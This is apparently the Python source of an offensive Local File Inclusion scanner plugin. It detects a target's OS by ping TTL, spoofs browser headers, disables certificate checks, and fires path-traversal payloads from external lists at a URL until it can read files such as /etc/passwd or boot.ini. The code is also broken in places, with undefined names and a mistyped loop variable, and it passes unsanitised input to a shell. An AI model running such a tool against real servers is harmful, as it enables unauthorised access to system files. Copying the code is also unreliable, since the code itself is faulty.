#!/usr/bin/python3
# coding: utf-8
# Local File Inclusion
# Plugin for D0M3Y

# *** IMPORTS *** #
import requests
from bs4 import BeautifulSoup
import subprocess
import re
import argparse
import colorama
import threading
from fake_headers import Headers
import urllib3

urllib3.disable_warnings()


# All Colors settings
GREEN = colorama.Fore.GREEN
GRAY = colorama.Fore.LIGHTBLACK_EX
RESET = colorama.Fore.RESET
YELLOW = colorama.Fore.YELLOW
WHITE = colorama.Fore.WHITE
BLUE = colorama.Fore.BLUE
RED = colorama.Fore.RED
CYAN = colorama.Fore.CYAN

# PAYLOADS LFI
LinuxLfiPayloads = open('linux_lfi.txt','r')

WindowsLfiPayloads = open('windows_lfi.txt','r')

# Default 
headers = Headers(os="mac",headers=True).generate()

def banner():
	msg = f'''

{CYAN}
 _  __ _                     
| |/ _(_)                    
| | |_ _ ___  ___ __ _ _ __  
| |  _| / __|/ __/ _` | '_ \ 
| | | | \__ \ (_| (_| | | | |
|_|_| |_|___/\___\__,_|_| |_|
				{YELLOW }(By G00dH4ck3r)

{RESET}

	'''

	print(msg)

try:
    def get_ttl(ip_address):
        proc = subprocess.Popen(["/bin/ping -c 1 %s" % ip_address, ""], stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        out = out.split()

        out = out[13].decode('utf-8')
        ttl_value = re.findall(r"\d{1,3}", out)[0]

        return ttl_value

    def get_os(ttl):

        ttl = int(ttl)

        if ttl >= 0 and ttl <= 64:
            return("Linux")
        elif ttl >= 64 and ttl <= 128:
            return("Windows")
        else:
            return("Not found")
except ValueError:
        sys.exit(1)

class LFI:
	def __init__(self,target):
		self.target = target

	def print_info(self,os):
		print("-"*80)
		print(f"{GREEN} [*] Target: {self.target}{RESET}")
		print(f"{GREEN} [*] OS: {os}{RESET}")
		print("-"*80)

	def windows_lfi_scanner(self,urltarget):
		# word if it's vulnerable
		string = "[boot loader]"

		for wlfi in WindowsLfiPayloads.readlines():
			wlfi = lfi.strip()

			# throw the requests

			# transform the param to fuzzing
			url = urltarget + wlfi

			print(f"\n{YELLOW}[+] Trying Payload: {lfi}{RESET}\n")

			getreq = requests.get(url,verify=False,cookies=cookies,headers=headers)
			print(getreq.text.lower())

			soup = BeautifulSoup(getreq.text,"lxml")

			if getreq.status_code == 200 and string in getreq.text:
				getlfi = soup.get_text().strip()
				print('\n')
				print(f"{GREEN}[+] Success with payload: {lfi}{RESET}"+'\n')
				print(getlfi)
				break
			else:
				continue

	def linux_lfi_scanner(self,urltarget):
		# word if it's vulnerable
		string = "root"
		for lfi in LinuxLfiPayloads.readlines():
			lfi = lfi.strip()

			# throw the requests

			# transform the param to fuzzing
			url = urltarget + lfi 
			print(f"\n{YELLOW}[+] Trying Payload: {lfi}{RESET}\n")

			getreq = requests.get(url,verify=False,cookies=cookies,headers=headers)
			print(getreq.text.lower())

			soup = BeautifulSoup(getreq.text,"lxml")

			if getreq.status_code == 200 and string in getreq.text:
				getlfi = soup.get_text().strip()
				print('\n')
				print(f"{GREEN}[+] Success with payload: {lfi}{RESET}"+'\n')
				print(getlfi)
				break
			else:
				continue

	def check_os(self):
		# In case of http requests
		ttl = get_ttl(self.target)
		os_name = get_os(ttl)

		print("Example: http://example.com/file.php?=")
		url = input(f"{YELLOW} [*] URL Target: {RESET}")
		print('\n')

		if os_name == "Linux":
			# print info 
			self.print_info(os_name)
			self.linux_lfi_scanner(url)
		elif os_name == "Windows":
			# print info 
			self.print_info(os_name)
			self.windows_lfi_scanner(url)
		else:
			sys.exit(0)
